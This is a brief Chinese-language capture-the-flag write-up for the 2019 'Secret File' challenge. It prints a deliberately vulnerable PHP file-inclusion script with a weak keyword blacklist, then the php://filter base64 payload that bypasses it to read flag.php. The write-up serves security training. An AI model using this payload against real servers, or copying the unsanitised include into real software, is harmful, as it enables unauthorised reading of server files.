# [极客大挑战 2019]Secret File

打开题目查看源代码，发现`./Archive_room.php`，点进去后发现`./action.php`，再点进去是END，提示回头看看。

发现`./action.php`会自动跳转到`end.php`，尝试抓包，发现`./action.php`存在`secr3t.php`，打开得到源代码：
```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

是文件包含的绕过，过滤了以下内容
1. ../
2. 大小写tp
3. 大小写input
4. 大小写data

这个过滤还是挺容易绕过的，php://filter直接读取flag.php：
```html
php://filter/read=convert.base64-encode/resource=flag.php
```

get flag!